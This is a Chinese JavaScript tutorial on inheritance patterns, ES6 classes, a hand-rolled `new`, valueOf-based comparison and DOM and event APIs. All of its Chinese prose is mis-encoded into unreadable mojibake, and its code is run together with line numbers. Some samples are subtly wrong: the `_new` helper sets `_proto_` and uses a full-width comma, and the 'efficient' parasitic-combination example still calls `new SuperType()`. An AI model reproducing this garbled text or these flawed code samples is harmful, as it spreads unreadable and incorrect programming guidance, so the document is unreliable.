å‡½æ•°å’Œå·¥åŽ‚æ¨¡å¼ç±»ä¼¼ï¼Œå³åˆ›å»ºä¸€ä¸ªä»…ç”¨äºŽå°è£…ç»§æ‰¿è¿‡ç¨‹çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°åœ¨å†…éƒ¨å·²æŸç§æ–¹å¼æ¥å¢žå¼ºå¯¹è±¡ï¼Œæœ€åŽå†åƒçœŸåœ°æ˜¯å®ƒåšäº†æ‰€æœ‰å·¥ä½œä¸€æ ·è¿”å›žå¯¹è±¡ã€‚ 1function createAnother(original) &#123; var clone = object(original);//é€šè¿‡è°ƒç”¨å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ clone.sayHi = function () &#123;//ä»¥æŸç§æ–¹å¼å¢žå¼ºè¿™ä¸ªå¯¹è±¡ console.log(&apos;hi&apos;); &#125;; return clone;//è¿”å›žè¿™ä¸ªå¯¹è±¡&#125;var person = &#123; name: &apos;Yvette&apos;, hobbies: [&apos;reading&apos;, &apos;photography&apos;]&#125;;var person2 = createAnother(person);person2.sayHi(); //hi åŸºäºŽ person è¿”å›žäº†ä¸€ä¸ªæ–°å¯¹è±¡ -â€”â€” person2ï¼Œæ–°å¯¹è±¡ä¸ä»…å…·æœ‰ person çš„æ‰€æœ‰å±žæ€§å’Œæ–¹æ³•ï¼Œè€Œä¸”è¿˜æœ‰è‡ªå·±çš„ sayHi()æ–¹æ³•ã€‚åœ¨è€ƒè™‘å¯¹è±¡è€Œä¸æ˜¯è‡ªå®šä¹‰ç±»åž‹å’Œæž„é€ å‡½æ•°çš„æƒ…å†µä¸‹ï¼Œå¯„ç”Ÿå¼ç»§æ‰¿ä¹Ÿæ˜¯ä¸€ç§æœ‰ç”¨çš„æ¨¡å¼ã€‚ ç¼ºç‚¹ï¼š ä½¿ç”¨å¯„ç”Ÿå¼ç»§æ‰¿æ¥ä¸ºå¯¹è±¡æ·»åŠ å‡½æ•°ï¼Œä¼šç”±äºŽä¸èƒ½åšåˆ°å‡½æ•°å¤ç”¨è€Œæ•ˆçŽ‡ä½Žä¸‹ã€‚ åŒåŽŸåž‹é“¾å®žçŽ°ç»§æ‰¿ä¸€æ ·ï¼ŒåŒ…å«å¼•ç”¨ç±»åž‹å€¼çš„å±žæ€§ä¼šè¢«æ‰€æœ‰å®žä¾‹å…±äº«ã€‚ 6. å¯„ç”Ÿç»„åˆå¼ç»§æ‰¿æ‰€è°“å¯„ç”Ÿç»„åˆå¼ç»§æ‰¿ï¼Œå³é€šè¿‡å€Ÿç”¨æž„é€ å‡½æ•°æ¥ç»§æ‰¿å±žæ€§ï¼Œé€šè¿‡åŽŸåž‹é“¾çš„æ··æˆå½¢å¼æ¥ç»§æ‰¿æ–¹æ³•ï¼ŒåŸºæœ¬æ€è·¯ï¼š ä¸å¿…ä¸ºäº†æŒ‡å®šå­ç±»åž‹çš„åŽŸåž‹è€Œè°ƒç”¨è¶…ç±»åž‹çš„æž„é€ å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦çš„ä»…æ˜¯è¶…ç±»åž‹åŽŸåž‹çš„ä¸€ä¸ªå‰¯æœ¬ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ä½¿ç”¨å¯„ç”Ÿå¼ç»§æ‰¿æ¥ç»§æ‰¿è¶…ç±»åž‹çš„åŽŸåž‹ï¼Œç„¶åŽå†å°†ç»“æžœæŒ‡å®šç»™å­ç±»åž‹çš„åŽŸåž‹ã€‚å¯„ç”Ÿç»„åˆå¼ç»§æ‰¿çš„åŸºæœ¬æ¨¡å¼å¦‚ä¸‹æ‰€ç¤ºï¼š 1function inheritPrototype(subType, superType) &#123; var prototype = object(superType.prototype); //åˆ›å»ºå¯¹è±¡ prototype.constructor = subType;//å¢žå¼ºå¯¹è±¡ subType.prototype = prototype;//æŒ‡å®šå¯¹è±¡&#125; ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºè¶…ç±»åž‹åŽŸåž‹çš„ä¸€ä¸ªå‰¯æœ¬ ç¬¬äºŒæ­¥ï¼šä¸ºåˆ›å»ºçš„å‰¯æœ¬æ·»åŠ  constructor å±žæ€§ ç¬¬ä¸‰æ­¥ï¼šå°†æ–°åˆ›å»ºçš„å¯¹è±¡èµ‹å€¼ç»™å­ç±»åž‹çš„åŽŸåž‹ è‡³æ­¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è°ƒç”¨ inheritPrototype æ¥æ›¿æ¢ä¸ºå­ç±»åž‹åŽŸåž‹èµ‹å€¼çš„è¯­å¥ï¼š 1function SuperType(name) &#123; this.name = name; this.colors = [&apos;pink&apos;, &apos;blue&apos;, &apos;green&apos;];&#125;//...codefunction SuberType(name, age) &#123; SuperType.call(this, name); this.age = age;&#125;SuberType.prototype = new SuperType();inheritPrototype(SuberType, SuperType);//...code ä¼˜ç‚¹: åªè°ƒç”¨äº†ä¸€æ¬¡è¶…ç±»æž„é€ å‡½æ•°ï¼Œæ•ˆçŽ‡æ›´é«˜ã€‚é¿å…åœ¨SuberType.prototypeä¸Šé¢åˆ›å»ºä¸å¿…è¦çš„ã€å¤šä½™çš„å±žæ€§ï¼Œä¸Žå…¶åŒæ—¶ï¼ŒåŽŸåž‹é“¾è¿˜èƒ½ä¿æŒä¸å˜ã€‚ å› æ­¤å¯„ç”Ÿç»„åˆç»§æ‰¿æ˜¯å¼•ç”¨ç±»åž‹æœ€ç†æ€§çš„ç»§æ‰¿èŒƒå¼ã€‚ å‡è®¾æˆ‘ä»¬å°†æ­¤æ–¹æ³•æ·»åŠ åˆ°æž„é€ å‡½æ•°æœ¬èº«ã€‚ ä¹Ÿè®¸ä¸æ˜¯æ¯ä¸ªPersonå®žä¾‹éƒ½éœ€è¦è¿™ç§æ–¹æ³•ã€‚è¿™ä¼šæµªè´¹å¤§é‡å†…å­˜ç©ºé—´ï¼Œå› ä¸ºå®ƒä»¬ä»ç„¶å…·æœ‰è¯¥å±žæ€§ï¼Œè¿™å ç”¨äº†æ¯ä¸ªå®žä¾‹çš„å†…å­˜ç©ºé—´ã€‚ ç›¸åï¼Œå¦‚æžœæˆ‘ä»¬åªå°†å®ƒæ·»åŠ åˆ°åŽŸåž‹ä¸­ï¼Œæˆ‘ä»¬åªéœ€å°†å®ƒæ”¾åœ¨å†…å­˜ä¸­çš„ä¸€ä¸ªä½ç½®ï¼Œä½†å®ƒä»¬éƒ½å¯ä»¥è®¿é—®å®ƒï¼ ES6classextendssuperé€šè¿‡super()è°ƒç”¨çˆ¶ç±»æž„é€ å‡½æ•°ï¼Œå¦‚æžœæœ‰superæ–¹æ³•ï¼Œéœ€è¦æ—¶æž„é€ å‡½æ•°ä¸­ç¬¬ä¸€ä¸ªæ‰§è¡Œçš„è¯­å¥ï¼Œthiså…³é”®å­—åœ¨è°ƒç”¨superä¹‹åŽæ‰å¯ç”¨ constructorstaticé™æ€æ–¹æ³•ï¼Œåœ¨ç±»å®šä¹‰çš„å¤–éƒ¨åªèƒ½é€šè¿‡ç±»åè°ƒç”¨ï¼Œå†…éƒ¨å¯ä»¥é€šè¿‡thisè°ƒç”¨ï¼Œå¹¶ä¸”é™æ€å‡½æ•°æ˜¯ä¼šè¢«ç»§æ‰¿çš„ã€‚ åŒºåˆ«å¤§å¤šæ•°æµè§ˆå™¨çš„ES5å®žçŽ°ä¹‹ä¸­ï¼Œæ¯ä¸€ä¸ªå¯¹è±¡éƒ½æœ‰__proto__å±žæ€§ï¼ŒæŒ‡å‘å¯¹åº”çš„æž„é€ å‡½æ•°çš„prototypeå±žæ€§ã€‚Classä½œä¸ºæž„é€ å‡½æ•°çš„è¯­æ³•ç³–ï¼ŒåŒæ—¶æœ‰prototypeå±žæ€§å’Œ__proto__å±žæ€§ï¼Œå› æ­¤åŒæ—¶å­˜åœ¨ä¸¤æ¡ç»§æ‰¿é“¾ã€‚ ï¼ˆ1ï¼‰å­ç±»çš„__proto__å±žæ€§ï¼Œè¡¨ç¤ºæž„é€ å‡½æ•°çš„ç»§æ‰¿ï¼Œæ€»æ˜¯æŒ‡å‘çˆ¶ç±»ã€‚ ï¼ˆ2ï¼‰å­ç±»prototypeå±žæ€§çš„__proto__å±žæ€§ï¼Œè¡¨ç¤ºæ–¹æ³•çš„ç»§æ‰¿ï¼Œæ€»æ˜¯æŒ‡å‘çˆ¶ç±»çš„prototypeå±žæ€§ã€‚ 1234class A &#123;&#125;class B extends A &#123;&#125;B.__proto__ === A // trueB.prototype.__proto__ === A.prototype // true ä¸Šé¢ä»£ç ä¸­ï¼Œå­ç±»Bçš„__proto__å±žæ€§æŒ‡å‘çˆ¶ç±»Aï¼Œå­ç±»Bçš„prototypeå±žæ€§çš„__proto__å±žæ€§æŒ‡å‘çˆ¶ç±»Açš„prototypeå±žæ€§ã€‚ è¿™æ ·çš„ç»“æžœæ˜¯å› ä¸ºï¼Œç±»çš„ç»§æ‰¿æ˜¯æŒ‰ç…§ä¸‹é¢çš„æ¨¡å¼å®žçŽ°çš„: 123456class A &#123;&#125;class B &#123;&#125;// Bçš„å®žä¾‹ç»§æ‰¿Açš„å®žä¾‹Object.setPrototypeOf(B.prototype, A.prototype);// Bç»§æ‰¿Açš„é™æ€å±žæ€§Object.setPrototypeOf(B, A); Object.setPrototypeOfçš„ç®€å•å®žçŽ°å¦‚ä¸‹ï¼š 1234Object.setPrototypeOf = function (obj, proto) &#123; obj.__proto__ = proto; return obj;&#125; å› æ­¤ï¼Œå°±å¾—åˆ°äº†ä¸Šé¢çš„ç»“æžœã€‚ 1234567Object.setPrototypeOf(B.prototype, A.prototype);// ç­‰åŒäºŽB.prototype.__proto__ = A.prototype;Object.setPrototypeOf(B, A);// ç­‰åŒäºŽB.__proto__ = A; è¿™ä¸¤æ¡ç»§æ‰¿é“¾ï¼Œå¯ä»¥è¿™æ ·ç†è§£ï¼šä½œä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå­ç±»ï¼ˆBï¼‰çš„åŽŸåž‹ï¼ˆ__proto__å±žæ€§ï¼‰æ˜¯çˆ¶ç±»ï¼ˆAï¼‰ï¼›ä½œä¸ºä¸€ä¸ªæž„é€ å‡½æ•°ï¼Œå­ç±»ï¼ˆBï¼‰çš„åŽŸåž‹ï¼ˆprototypeå±žæ€§ï¼‰æ˜¯çˆ¶ç±»çš„å®žä¾‹ã€‚ 123Object.create(A.prototype);// ç­‰åŒäºŽB.prototype.__proto__ = A.prototype; ä¸è¶³ ä¸æ”¯æŒé™æ€å±žæ€§ï¼ˆé™¤å‡½æ•°ï¼‰ã€‚ classä¸­ä¸èƒ½å®šä¹‰ç§æœ‰å˜é‡å’Œå‡½æ•°ã€‚classä¸­å®šä¹‰çš„æ‰€æœ‰å‡½æ•°éƒ½ä¼šè¢«æ”¾å€’åŽŸåž‹å½“ä¸­ï¼Œéƒ½ä¼šè¢«å­ç±»ç»§æ‰¿ï¼Œè€Œå±žæ€§éƒ½ä¼šä½œä¸ºå®žä¾‹å±žæ€§æŒ‚åˆ°thisä¸Šã€‚å¦‚æžœå­ç±»æƒ³å®šä¹‰ä¸€ä¸ªç§æœ‰çš„æ–¹æ³•æˆ–å®šä¹‰ä¸€ä¸ªprivate å˜é‡ï¼Œä¾¿ä¸èƒ½ç›´æŽ¥åœ¨classèŠ±æ‹¬å·å†…å®šä¹‰ï¼Œè¿™çœŸçš„å¾ˆä¸æ–¹ä¾¿ï¼ æ€»ç»“ä¸€ä¸‹ï¼Œå’Œes5ç›¸æ¯”ï¼Œes6åœ¨è¯­è¨€å±‚é¢ä¸Šæä¾›äº†é¢å‘å¯¹è±¡çš„éƒ¨åˆ†æ”¯æŒï¼Œè™½ç„¶å¤§å¤šæ•°æ—¶å€™åªæ˜¯ä¸€ä¸ªè¯­æ³•ç³–ï¼Œä½†ä½¿ç”¨èµ·æ¥æ›´æ–¹ä¾¿ï¼Œè¯­æ„åŒ–æ›´å¼ºã€æ›´ç›´è§‚ï¼ŒåŒæ—¶ä¹Ÿç»™javascriptç»§æ‰¿æä¾›ä¸€ä¸ªæ ‡å‡†çš„æ–¹å¼ã€‚è¿˜æœ‰å¾ˆé‡è¦çš„ä¸€ç‚¹å°±æ˜¯ï¼es6æ”¯æŒåŽŸç”Ÿå¯¹è±¡ç»§æ‰¿ã€‚ new å£°æ˜Žä¸€ä¸ªä¸­é—´å¯¹è±¡ï¼› å°†è¯¥ä¸­é—´å¯¹è±¡çš„åŽŸåž‹æŒ‡å‘æž„é€ å‡½æ•°çš„åŽŸåž‹ï¼› å°†æž„é€ å‡½æ•°çš„thisï¼ŒæŒ‡å‘è¯¥ä¸­é—´å¯¹è±¡ï¼› è¿”å›žè¯¥ä¸­é—´å¯¹è±¡ï¼Œå³è¿”å›žå®žä¾‹å¯¹è±¡ã€‚ 1234567891011121314function _new()&#123; let target = &#123;&#125;;//åˆ›å»ºç©ºå¯¹è±¡ let [constructor,...args] = [...arguments] //æ‰§è¡ŒåŽŸåž‹è¿žæŽ¥ï¼›targetæ˜¯ constructorçš„å®žä¾‹ target._proto_=constructor.prototype //æ‰§è¡Œæž„é€ å‡½æ•°ï¼Œå°†å±žæ€§æˆ–æ–¹æ³•æ·»åŠ åˆ°ç©ºå¯¹è±¡ä¸Š let result = constructor.apply(targetï¼Œargs); //æž„é€ å‡½æ•°ä¸­çš„thisæŒ‡å‘ç©ºå¯¹è±¡ if(result&amp;&amp;(typeof (result)==&quot;object&quot;||typeof(result)==&quot;function&quot;))&#123; return result //å¦‚æžœæž„é€ å‡½æ•°æ‰§è¡Œçš„ç»“æž„è¿”å›žçš„æ˜¯ä¸€ä¸ªå¯¹è±¡æˆ–æ–¹æ³•ï¼Œåˆ™è¿”å›ž &#125; return target//ä¸æ˜¯åˆ™è¿”å›žæ–°å¯¹è±¡&#125; å°è£…å°è£…ï¼Œå³éšè—å¯¹è±¡çš„å±žæ€§å’Œå®žçŽ°ç»†èŠ‚ï¼Œä»…å¯¹å¤–å…¬å¼€æŽ¥å£ï¼ŒæŽ§åˆ¶åœ¨ç¨‹åºä¸­å±žæ€§çš„è¯»å’Œä¿®æ”¹çš„è®¿é—®çº§åˆ«ï¼›å°†æŠ½è±¡å¾—åˆ°çš„æ•°æ®å’Œè¡Œä¸ºï¼ˆæˆ–åŠŸèƒ½ï¼‰ç›¸ç»“åˆï¼Œå½¢æˆä¸€ä¸ªæœ‰æœºçš„æ•´ä½“ï¼Œä¹Ÿå°±æ˜¯å°†æ•°æ®ä¸Žæ“ä½œæ•°æ®çš„æºä»£ç è¿›è¡Œæœ‰æœºçš„ç»“åˆï¼Œå½¢æˆâ€œç±»â€ï¼Œå…¶ä¸­æ•°æ®å’Œå‡½æ•°éƒ½æ˜¯ç±»çš„æˆå‘˜ã€‚ å¤šæ€åŒä¸€æ“ä½œä½œç”¨äºŽä¸åŒçš„å¯¹è±¡ï¼Œå¯ä»¥æœ‰ä¸åŒçš„è§£é‡Šï¼Œäº§ç”Ÿä¸åŒçš„æ‰§è¡Œç»“æžœã€‚åœ¨è¿è¡Œæ—¶ï¼Œå¯ä»¥é€šè¿‡æŒ‡å‘åŸºç±»çš„æŒ‡é’ˆï¼Œæ¥è°ƒç”¨å®žçŽ°æ´¾ç”Ÿç±»ä¸­çš„æ–¹æ³•ã€‚ è™šå‡½æ•°å’Œæ¨¡ç‰ˆï¼ˆjavaä¸­çš„èŒƒåž‹ï¼‰æ˜¯æ”¯æŒå¤šæ€çš„ä¸»è¦æ–¹å¼ï¼Œå› ä¸ºjavascriptä¸­æ²¡æœ‰æ¨¡ç‰ˆï¼Œæ‰€ä»¥ä¸‹é¢æˆ‘ä»¬åªè®¨è®ºè™šå‡½æ•°ï¼Œä¸‹é¢å…ˆçœ‹ä¸€ä¸ªä¾‹å­ï¼š 1234567891011121314151617181920212223function Person(name,age)&#123; this.name=name this.age=age&#125;Person.prototype.toString=function()&#123; return "I am a Person, my name is "+ this.name&#125;function Man(name,age)&#123; Person.apply(this,arguments)&#125;Man.prototype = Object.create(Person.prototype);Man.prototype.toString=function()&#123; return "I am a Man, my name is"+this.name;&#125;var person=new Person("Neo",19)var man1=new Man("Davin",18)var man2=new Man("Jack",19)&gt; person+""&gt; "I am a Person, my name is Neo"&gt; man1+""&gt; "I am a Man, my name isDavin"&gt; man1&lt;man2 //æœŸæœ›æ¯”è¾ƒå¹´é¾„å¤§å° 1&gt; false ä¸Šé¢ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬åˆ†åˆ«åœ¨å­ç±»å’Œçˆ¶ç±»å®žçŽ°äº†toStringæ–¹æ³•ï¼Œå…¶å®žï¼Œåœ¨jsä¸­ä¸Šè¿°ä»£ç åŽŸç†å¾ˆç®€å•ï¼Œå¯¹äºŽåŒåå‡½æ•°ï¼Œå­ç±»ä¼šè¦†çˆ¶ç±»çš„ï¼Œè¿™ç§ç‰¹æ€§å…¶å®žå°±æ˜¯è™šå‡½æ•°ï¼Œåªä¸è¿‡jsä¸­ä¸åŒºåˆ†å‚æ•°ä¸ªæ•°ï¼Œä¹Ÿä¸åŒºåˆ†å‚æ•°ç±»åž‹ï¼Œåªçœ‹å‡½æ•°åç§°ï¼Œå¦‚æžœåç§°ç›¸åŒå°±ä¼šè¦†ç›–ã€‚çŽ°åœ¨æˆ‘ä»¬æ¥çœ‹æ³¨é‡Š1ï¼Œæˆ‘ä»¬æœŸæœ›ç›´æŽ¥ç”¨æ¯”è¾ƒè¿ç®—ç¬¦æ¯”è¾ƒä¸¤ä¸ªmançš„å¤§å°ï¼ˆæŒ‰å¹´é¾„ï¼‰ï¼Œæ€Žä¹ˆå®žçŽ°ï¼Ÿåœ¨c++ä¸­æœ‰è¿ç®—ç¬¦é‡è½½ï¼Œä½†javaå’Œjsä¸­éƒ½æ²¡æœ‰ï¼Œæ‰€å¹¸çš„æ˜¯ï¼Œjså¯ä»¥ç”¨ä¸€ç§å˜é€šçš„æ–¹æ³•æ¥å®žçŽ°ï¼š 123456789101112131415161718192021222324252627function Person(name,age)&#123; this.name=name this.age=age&#125;Person.prototype.valueOf=function()&#123; return this.age&#125;function Man(name,age)&#123; Person.apply(this,arguments)&#125;Man.prototype = Object.create(Person.prototype);var person=new Person("Neo",19)var man1=new Man("Davin",18)var man2=new Man("Jack",19)var man3=new Man("Joe",19)&gt;man1&lt;19//1&gt;true&gt;person==19//2&gt;true&gt;man1&lt;man2//3&gt;true&gt;man2==man3 //4 æ³¨æ„&gt;true&gt;person==man2//5&gt;false å…¶ä¸­1ã€2ã€3ã€5åœ¨æ‰€æœ‰js vmä¸‹ç»“æžœéƒ½æ˜¯ç¡®å®šçš„ã€‚ä½†æ˜¯4å¹¶ä¸ä¸€å®šï¼javascriptè§„å®šï¼Œå¯¹äºŽæ¯”è¾ƒè¿ç®—ç¬¦ï¼Œå¦‚æžœä¸€ä¸ªå€¼æ˜¯å¯¹è±¡ï¼Œå¦ä¸€ä¸ªå€¼æ˜¯æ•°å­—æ—¶ï¼Œä¼šå…ˆå°è¯•è°ƒç”¨valueOfï¼Œå¦‚æžœvalueOfæœªæŒ‡å®šï¼Œå°±ä¼šè°ƒç”¨toStringï¼›å¦‚æžœæ˜¯å­—ç¬¦ä¸²æ—¶ï¼Œåˆ™å…ˆå°è¯•è°ƒç”¨toStringï¼Œå¦‚æžœæ²¡æŒ‡å®šï¼Œåˆ™å°è¯•valueOfï¼Œå¦‚æžœä¸¤è€…éƒ½æ²¡æŒ‡å®šï¼Œå°†æŠ›å‡ºä¸€ä¸ªç±»åž‹é”™è¯¯å¼‚å¸¸ã€‚å¦‚æžœæ¯”è¾ƒçš„ä¸¤ä¸ªå€¼éƒ½æ˜¯å¯¹è±¡æ—¶ï¼Œåˆ™æ¯”è¾ƒçš„æ—¶å¯¹è±¡çš„å¼•ç”¨åœ°å€ï¼Œæ‰€ä»¥è‹¥æ˜¯å¯¹è±¡ï¼Œåªæœ‰è‡ªèº«ï¼ï¼ï¼è‡ªèº«ï¼Œå…¶å®ƒæƒ…å†µéƒ½æ˜¯falseã€‚çŽ°åœ¨æˆ‘ä»¬å›žè¿‡å¤´æ¥çœ‹çœ‹ç¤ºä¾‹ä»£ç ï¼Œå‰ä¸‰ä¸ªéƒ½æ˜¯æ ‡å‡†çš„è¡Œä¸ºã€‚è€Œç¬¬å››ç‚¹å–å†³äºŽæµè§ˆå™¨çš„å®žçŽ°ï¼Œå¦‚æžœä¸¥æ ¼æŒ‰ç…§æ ‡å‡†ï¼Œè¿™åº”è¯¥ç®—æ˜¯chromeçš„ä¸€ä¸ªbug ,ä½†æ˜¯ï¼Œæˆ‘ä»¬çš„ä»£ç ä½¿ç”¨æ—¶åŒç­‰å·ï¼Œå¹¶éžä¸¥æ ¼ç›¸ç­‰åˆ¤æ–­ï¼Œæ‰€ä»¥æµè§ˆå™¨çš„ç›¸ç­‰è§„åˆ™ä¹Ÿä¼šæ”¾å®½ã€‚å€¼å¾—ä¸€æçš„æ˜¯5ï¼Œè™½ç„¶personå’Œman2 ageéƒ½æ˜¯19ï¼Œä½†æ˜¯ç»“æžœå´æ˜¯falseã€‚æ€»ç»“ä¸€ä¸‹ï¼Œchromeå¯¹ç›¸åŒç±»çš„å®žä¾‹æ¯”è¾ƒç­–ç•¥æ˜¯å…ˆä¼šå°è¯•è½¬åŒ–ï¼Œç„¶åŽå†æ¯”è¾ƒå¤§å°ï¼Œè€Œå¯¹éžåŒç±»å®žä¾‹çš„æ¯”è¾ƒï¼Œåˆ™ä¼šç›´æŽ¥è¿”å›žfalseï¼Œä¸ä¼šåšä»»ä½•è½¬åŒ–ã€‚ æ‰€ä»¥æˆ‘çš„å»ºè®®æ˜¯ï¼šå¦‚æžœæ•°å­—å’Œç±»å®žä¾‹æ¯”è¾ƒï¼Œæ°¸è¿œæ˜¯å®‰å…¨çš„ï¼Œå¯ä»¥æ”¾å¿ƒçŽ©ï¼Œå¦‚æžœæ˜¯åŒç±»å®žä¾‹ä¹‹é—´ï¼Œå¯ä»¥è¿›è¡Œéžç­‰æ¯”è¾ƒï¼Œè¿™ä¸ªç»“æžœæ˜¯å¯ä»¥ä¿è¯çš„ï¼Œä¸è¦è¿›è¡Œç›¸ç­‰æ¯”è¾ƒï¼Œç»“æžœæ˜¯ä¸èƒ½ä¿è¯çš„ï¼Œä¸€èˆ¬ç›¸ç­‰æ¯”è¾ƒï¼Œå˜é€šçš„åšæ³•æ˜¯ï¼š 12var equal= !(ob1&lt;ob2||ob1&gt;ob2) //ä¸å°äºŽä¹Ÿä¸å¤§äºŽï¼Œå°±æ˜¯ç­‰äºŽï¼Œå‰ææ˜¯æ¯”è¾ƒæ“ä½œç¬¦ä¸¤è¾¹çš„å¯¹è±¡è¦å®žçŽ°valueOfæˆ–toString å½“ç„¶ç±»ä¼¼toStringã€valueOfçš„è¿˜æœ‰toJsonæ–¹æ³•ï¼Œä½†å®ƒå’Œé‡è½½æ²¡æœ‰ä»€ä¹ˆå…³ç³»ï¼Œæ•…ä¸å†—è¿°ã€‚ DOMå¢žåˆ æŸ¥æ”¹å¢ž12345678document.createElement(&apos;div&apos;);document.createTextNode(&apos;hello world!&apos;);ele.appendChild(el);ele.insertBefore(newElement, referenceElement);//insertAfteræ˜¯jQueryæ–¹æ³•insertAdjacentHTML insertAdjacentHTML() å°†æŒ‡å®šçš„æ–‡æœ¬è§£æžä¸ºHTMLæˆ–XMLï¼Œå¹¶å°†ç»“æžœèŠ‚ç‚¹æ’å…¥åˆ°DOMæ ‘ä¸­çš„æŒ‡å®šä½ç½®ã€‚å®ƒä¸ä¼šé‡æ–°è§£æžå®ƒæ­£åœ¨ä½¿ç”¨çš„å…ƒç´ ï¼Œå› æ­¤å®ƒä¸ä¼šç ´åå…ƒç´ å†…çš„çŽ°æœ‰å…ƒç´ ã€‚è¿™é¿å…äº†é¢å¤–çš„åºåˆ—åŒ–æ­¥éª¤ï¼Œä½¿å…¶æ¯”ç›´æŽ¥innerHTMLæ“ä½œæ›´å¿«ã€‚ 1ele.insertAdjacentHTML(position, text); positionæ˜¯ç›¸å¯¹äºŽå…ƒç´ çš„ä½ç½®ï¼Œå¹¶ä¸”å¿…é¡»æ˜¯ä»¥ä¸‹å­—ç¬¦ä¸²ä¹‹ä¸€ï¼š beforebegin: å…ƒç´ è‡ªèº«çš„å‰é¢ã€‚ afterbegin: æ’å…¥å…ƒç´ å†…éƒ¨çš„ç¬¬ä¸€ä¸ªå­èŠ‚ç‚¹ä¹‹å‰ã€‚ beforeend: æ’å…¥å…ƒç´ å†…éƒ¨çš„æœ€åŽä¸€ä¸ªå­èŠ‚ç‚¹ä¹‹åŽã€‚ afterend: å…ƒç´ è‡ªèº«çš„åŽé¢ã€‚textæ˜¯è¦è¢«è§£æžä¸ºHTMLæˆ–XML,å¹¶æ’å…¥åˆ°DOMæ ‘ä¸­çš„å­—ç¬¦ä¸²ã€‚ ä½ç½®åç§°çš„å¯è§†åŒ–ï¼š 1234567&lt;!-- beforebegin --&gt; &lt;p&gt; &lt;!-- afterbegin --&gt; foo &lt;!-- beforeend --&gt;&lt;/p&gt;&lt;!-- afterend --&gt; æ³¨æ„ï¼š beforebeginå’Œafterendä½ç½®,ä»…åœ¨èŠ‚ç‚¹åœ¨æ ‘ä¸­ä¸”èŠ‚ç‚¹å…·æœ‰ä¸€ä¸ªparentå…ƒç´ æ—¶å·¥ä½œ. åˆ 1ele.removeChild(el); æŸ¥123456789101112131415161718192021222324document.querySelector(&quot;.myclass&quot;);document.querySelectorAll(&quot;div.note, div.alert&quot;);document.getElementById(&apos;xxx&apos;);document.getElementsByClassName(&apos;highlight&apos;);document.getElementsByTagName(&apos;td&apos;);var parent = ele.parentElement;var parent = ele.parentNode;// èŽ·å–å­èŠ‚ç‚¹ï¼Œå­èŠ‚ç‚¹å¯ä»¥æ˜¯ä»»ä½•ä¸€ç§èŠ‚ç‚¹ï¼Œå¯ä»¥é€šè¿‡nodeTypeæ¥åˆ¤æ–­var nodes = ele.children; // æŸ¥è¯¢å­å…ƒç´ var els = ele.getElementsByTagName(&apos;td&apos;);var els = ele.getElementsByClassName(&apos;highlight&apos;);// å½“å‰å…ƒç´ çš„ç¬¬ä¸€ä¸ª/æœ€åŽä¸€ä¸ªå­å…ƒç´ èŠ‚ç‚¹var el = ele.firstChild;var el = ele.firstElementChild;var el = ele.lastChild;var el = ele.lastElementChild;// ä¸‹ä¸€ä¸ª/ä¸Šä¸€ä¸ªå…„å¼Ÿå…ƒç´ èŠ‚ç‚¹var el = ele.nextSibling;var el = ele.nextElementSibling;var el = ele.previousSibling;var el = ele.previousElementSibling; æ”¹12345678ele.replaceChild(el1, el2);ele.innerHTML//å¦‚æžœä½ çš„é¡¹ç›®å°†è¦ç»è¿‡å„ç§å½¢å¼çš„å®‰å…¨æ£€æŸ¥çš„è¯ï¼Œä½¿ç”¨ innerHTML å¯èƒ½å¯¼è‡´ä»£ç è¢«æ‹’ç»ã€‚ele.innerTextinnerHTMLï¼šå†…éƒ¨HTMLï¼Œcontent&lt;br/&gt;ï¼›outerHTMLï¼šå¤–éƒ¨HTMLï¼Œ&lt;div&gt;content&lt;br/&gt;&lt;/div&gt;ï¼›innerTextï¼šå†…éƒ¨æ–‡æœ¬ï¼Œcontent ï¼›outerTextï¼šå†…éƒ¨æ–‡æœ¬ï¼Œcontent ï¼› äº‹ä»¶æµã€äº‹ä»¶æ¨¡åž‹JSDOMæ ‡å‡†äº‹ä»¶æµçš„è§¦å‘çš„å…ˆåŽé¡ºåºä¸ºï¼šå…ˆæ•èŽ·å†å†’æ³¡ï¼Œç‚¹å‡»DOMèŠ‚ç‚¹æ—¶ï¼Œäº‹ä»¶ä¼ æ’­é¡ºåºï¼šäº‹ä»¶æ•èŽ·é˜¶æ®µï¼Œä»Žä¸Šå¾€ä¸‹ä¼ æ’­ï¼Œç„¶åŽåˆ°è¾¾äº‹ä»¶ç›®æ ‡èŠ‚ç‚¹ï¼Œæœ€åŽæ˜¯å†’æ³¡é˜¶æ®µï¼Œä»Žä¸‹å¾€ä¸Šä¼ æ’­ DOMèŠ‚ç‚¹æ·»åŠ äº‹ä»¶ç›‘å¬æ–¹æ³•addEventListenerï¼Œä¸­å‚æ•°captureå¯ä»¥æŒ‡å®šè¯¥ç›‘å¬æ˜¯æ·»åŠ åœ¨äº‹ä»¶æ•èŽ·é˜¶æ®µè¿˜æ˜¯äº‹ä»¶å†’æ³¡é˜¶æ®µï¼Œä¸ºfalseæ˜¯äº‹ä»¶å†’æ³¡ï¼Œä¸ºtrueæ˜¯äº‹ä»¶æ•èŽ·ï¼Œå¹¶éžæ‰€æœ‰çš„äº‹ä»¶éƒ½æ”¯æŒå†’æ³¡ï¼Œæ¯”å¦‚focusï¼Œblurç­‰ç­‰ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡event.bubblesæ¥åˆ¤æ–­ äº‹ä»¶æ¨¡åž‹æœ‰ä¸‰ä¸ªå¸¸ç”¨æ–¹æ³•ï¼š event.stopPropagation:é˜»æ­¢æ•èŽ·å’Œå†’æ³¡é˜¶æ®µä¸­ï¼Œå½“å‰äº‹ä»¶çš„è¿›ä¸€æ­¥ä¼ æ’­ï¼Œ event.stopImmediatePropagetionï¼Œé˜»æ­¢è°ƒç”¨ç›¸åŒäº‹ä»¶çš„å…¶ä»–ä¾¦å¬å™¨ï¼Œ event.preventDefaultï¼Œå–æ¶ˆè¯¥äº‹ä»¶ï¼ˆå‡å¦‚äº‹ä»¶æ˜¯å¯å–æ¶ˆçš„ï¼‰è€Œä¸åœæ­¢äº‹ä»¶çš„è¿›ä¸€æ­¥ä¼ æ’­ï¼Œ event.targetï¼šæŒ‡å‘è§¦å‘äº‹ä»¶çš„å…ƒç´ 